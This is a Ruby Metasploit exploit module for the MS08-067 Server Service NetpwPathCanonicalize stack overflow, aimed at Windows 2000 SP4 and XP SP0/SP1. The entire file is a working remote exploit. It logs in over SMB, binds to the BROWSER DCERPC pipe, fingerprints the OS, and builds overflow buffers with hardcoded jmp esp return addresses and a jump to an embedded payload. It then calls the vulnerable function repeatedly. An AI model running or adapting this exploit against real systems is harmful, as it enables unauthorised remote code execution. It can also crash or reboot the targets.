require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
   
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB

   def initialize(info = {})
      super(update_info(info,
         'Name'           => 'Microsoft Server Service NetpwPathCanonicalize Overflow (MS08-067)',
         'Description'    => %q{
            This module exploits a stack overflow vulnerability triggered through 
            NetpwPathCanonicalize RPC call in the Server Service.
            Due to the nature of this bug, the stack needs to filled up with certain
            chars in order to achieve reliable exploitation. A failed exploit attempt
            will likely result in a complete reboot on Windows 2000 and the termination 
            of all SMB-related services on Windows XP.

            This exploit is tested against systems with MS06-040 patch installed.
         },
         'Platform'       => 'win',
         'Author'         => ['Abhisek Datta'],
         'References'     => 
            [
               ['MSB', 'MS08-067']
            ],
         'Targets'        =>
            [
               ["Automatic (Windows 2000-SP4, Windows XP-SP0/SP1", {} ]
            ],
         'DefaultOptions' =>
            {  
               'EXITFUNC' => 'thread',
            },
         'Payload'        =>
            {
               'Space'    => 512,
               'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e",
               'StackAdjustment' => -3500,
            }, 
         'DefaultTarget'  => 0))
   end

   def exploit
      print_status("Connecting to remote host")
      connect()
      smb_login()

      print_status("Target OS: #{smb_peer_os}")
      handle = dcerpc_handle(
         '4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',
         'ncacn_np', ["\\BROWSER"]   
      )
      
      print_status("Binding to #{handle} ...")
      dcerpc_bind(handle)
      print_status("Bound to #{handle} ...")
      
      smb_peer_os =~ /Windows (\d).(\d)/
      
      if ($1.to_i == 5) and ($2.to_i == 0)
         print_status("Trying to exploit a Windows 2000")
         
         # Fillup the stack with \..\..\
         print_status("Filling up stack with \\..\\")
         path = 
            ("\\c\\..\\") +
            ("..\\" * 100) +
            ("AAAA") +
            ("\x00\x00")

         stub =
            NDR.long(rand(0xffffffff)) +
            NDR.UnicodeConformantVaryingString('') +
            NDR.UnicodeConformantVaryingString(path) +
            #NDR.UnicodeConformantVaryingStringPreBuilt(path) +
            NDR.long(rand(0xf0)+1) +
            NDR.UnicodeConformantVaryingString('') +
            NDR.long(rand(0xf0)+1) +
            NDR.long(0)
         
         begin
            dcerpc.call(0x1f, stub)
         rescue => e
         end

         buf = "XXXXXX" +
               ("A" * 540) +
               ("BBBB") +     # <-- EIP
               ("C" * 74) +   # <-- ESP     
               "XXXX"

         py = payload.encoded
         pad = "A" * 546
         pad[pad.size - py.size, py.size] = py
         win2k_sp4_jmp_esp = 0x77e14c29
         jumper = "\xe9" + [-5 - 4 - py.size - 10].pack('V')

         buf = 
            pad +
            [win2k_sp4_jmp_esp].pack('V') +
            jumper +
            "XXXX"

      elsif ($1.to_i == 5) and ($2.to_i == 1)
         sp_2 = false
         begin
            smb_create("\\SRVSVC")
         rescue ::Rex::Proto::SMB::Exceptions::ErrorCode => e
            if (e.error_code == 0xc0000022)
               sp_2 = true
            end
         end

         if sp_2
            print_status("Windows XP/SP2 is not supported yet")
            disconnect

            return
         end

         print_status("Trying to exploit a Windows XP SP0/SP1")
         
         winxp_sp0_jmp_esp = 0x71ab7bfb
         pad = "A" * 590
         pad[pad.size - payload.encoded.size, payload.encoded.size] = payload.encoded
         jumper = "\xe9" + [-5 -20 - 4 - payload.encoded.size - 10].pack('V')
         
         buf = ("A" * 590) +
               ("BBBB") +        # <-- EIP
               ("C" * 20) +      # <-- ?? 
               ("XXXXXXXXXXXX")  # <-- ESP

         #pad = "A" * 590
         #pad[pad.size - 50, 50] = "\xcc" * 50
         buf = pad +
               [winxp_sp0_jmp_esp].pack('V') +
               ("C" * 20) +
               jumper +
               ("X" * 7)
      else
         print_status("Target not supported")
         disconnect

         return
      end

      path = "\x5c\x00\x63\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00"
      path += "\x41\x00\x41\x00"
      path += buf
      path += "\x00\x00"
      #path = "\\c\\..\\..\\" + ("A" * 46) + "\x00\x00"
      stub =
         NDR.long(rand(0xffffffff)) +
         NDR.UnicodeConformantVaryingString('') +
         #NDR.UnicodeConformantVaryingString(path) +
         NDR.UnicodeConformantVaryingStringPreBuilt(path) +
         NDR.long(rand(0xf0)+1) +
         NDR.UnicodeConformantVaryingString('') +
         NDR.long(rand(0xf0)+1) +
         NDR.long(0)
      
      10.times do
         print_status("Calling vulnerable function..")
         begin
            dcerpc.call(0x1f, stub)
         rescue Rex::Proto::DCERPC::Exceptions::NoResponse,
                Rex::Proto::SMB::Exceptions::NoReply
            print_status("No response from server, this is good")
            sleep(5)
            break
         rescue Errno::ECONNRESET
            print_status("Connection reset by peer, this is good")
            sleep(5)
            break
         rescue => e
            print_status("Exception: #{e.message} (#{e.class})")
         end
         #break
      end
      
      handler
      disconnect
   end

   private
   def to_ws(str)
      ws = ""
      str.each_byte do |b|
         ws << [b].pack('v')
      end
   end
end
